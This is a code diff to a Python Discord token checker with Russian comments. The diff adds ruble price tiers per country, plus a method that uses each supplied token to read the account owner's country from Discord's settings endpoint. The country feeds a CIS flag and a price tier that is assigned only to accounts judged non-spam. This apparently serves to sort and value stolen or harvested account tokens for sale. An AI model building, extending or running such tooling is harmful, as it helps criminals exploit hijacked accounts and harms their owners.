@@ -15,10 +15,35 @@ logger = logging.getLogger(__name__)
 class DiscordAdvancedChecker:
     """Продвинутый чекер Discord токенов"""
     
-    # Tier классификация стран
-    TIER_1 = ['us', 'ca', 'gb', 'au', 'de', 'fr', 'nl', 'se', 'no', 'dk', 'fi', 'ch', 'at', 'be', 'ie', 'nz', 'sg', 'jp', 'kr']
-    TIER_2 = ['es', 'it', 'pt', 'pl', 'cz', 'gr', 'il', 'ae', 'sa', 'kw', 'qa', 'bh', 'om', 'hk', 'tw', 'my', 'th']
-    TIER_3 = ['br', 'mx', 'ar', 'cl', 'co', 'pe', 'in', 'id', 'ph', 'vn', 'tr', 'ro', 'hu', 'bg', 'hr', 'rs', 'ua', 'eg', 'za']
+    # Tier классификация стран по ценам
+    # Tier-1: 220₽ - топовые англоязычные и развитые страны (6 стран)
+    TIER_1 = ['us', 'gb', 'ca', 'au', 'de', 'fr']
+    
+    # Tier-2: 170₽ - развитая Европа и богатая Азия (22 страны)
+    TIER_2 = [
+        # Европа
+        'nl', 'se', 'no', 'dk', 'fi', 'ch', 'at', 'be', 'ie', 'es', 'it', 'pt', 'pl', 'cz', 'gr',
+        # Азия/Средний Восток
+        'jp', 'kr', 'sg', 'hk', 'il', 'ae',
+        # Океания
+        'nz'
+    ]
+    
+    # Tier-3: 80₽ - все остальные страны
+    TIER_3 = [
+        # Латинская Америка
+        'br', 'mx', 'ar', 'cl', 'co', 'pe', 'uy', 've', 'ec', 'bo',
+        # Азия
+        'in', 'id', 'ph', 'vn', 'th', 'my', 'bd', 'pk', 'lk', 'np',
+        # Восточная Европа
+        'tr', 'ro', 'hu', 'bg', 'hr', 'rs', 'sk', 'si', 'lt', 'lv', 'ee',
+        # Африка
+        'eg', 'za', 'ng', 'ke', 'ma', 'tn', 'dz',
+        # Ближний Восток
+        'sa', 'kw', 'qa', 'bh', 'om', 'jo', 'lb',
+        # Другие
+        'tw', 'cn'
+    ]
     
     # СНГ страны
     CIS = ['ru', 'by', 'kz', 'uz', 'am', 'az', 'ge', 'kg', 'tj', 'tm', 'md']
@@ -40,6 +65,30 @@ class DiscordAdvancedChecker:
         self.session.headers.update({
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
         })
+    
+    def get_user_country(self, token: str) -> Optional[str]:
+        """Получает реальную страну пользователя из настроек"""
+        try:
+            headers = {'Authorization': token}
+            response = self.session.get(
+                'https://discord.com/api/v9/users/@me/settings', 
+                headers=headers, 
+                timeout=10
+            )
+            
+            if response.status_code == 200:
+                data = response.json()
+                # Пробуем разные поля
+                country = data.get('locale', '').lower()[:2]  # en-US -> en
+                
+                # Если есть geo_restricted_discovery - там может быть страна
+                if 'geo_restricted_discovery' in data:
+                    return data['geo_restricted_discovery'].get('country_code', '').lower()
+                
+                return country if country else None
+            return None
+        except:
+            return None
     
     def check_token_validity(self, token: str) -> Tuple[bool, Optional[Dict]]:
         """Проверяет валидность токена и возвращает данные пользователя"""
@@ -225,8 +274,14 @@ class DiscordAdvancedChecker:
         result['username'] = user_data.get('username')
         result['locale'] = user_data.get('locale', '').lower()
         
+        # Получаем реальную страну из настроек
+        country_code = self.get_user_country(token)
+        if not country_code:
+            # Fallback на locale
+            country_code = result['locale'][:2] if result['locale'] else None
+        
         # СНГ проверка
-        result['is_cis'] = result['locale'] in self.CIS
+        result['is_cis'] = country_code in self.CIS if country_code else False
         
         # Флаги
         result['flags'] = self.get_user_flags(user_data)
@@ -249,9 +304,9 @@ class DiscordAdvancedChecker:
         # Проспам - проверяем последние сообщения на спам
         result['spam_status'] = self.check_spam_by_bot_method(token, valid_dms)
         
-        # Tier (только для непроспама)
+        # Tier (только для непроспама) - используем country_code
         if result['spam_status'] == 'non_spam':
-            result['tier'] = self.get_country_tier(result['locale'])
+            result['tier'] = self.get_country_tier(country_code)
         
         return result
     
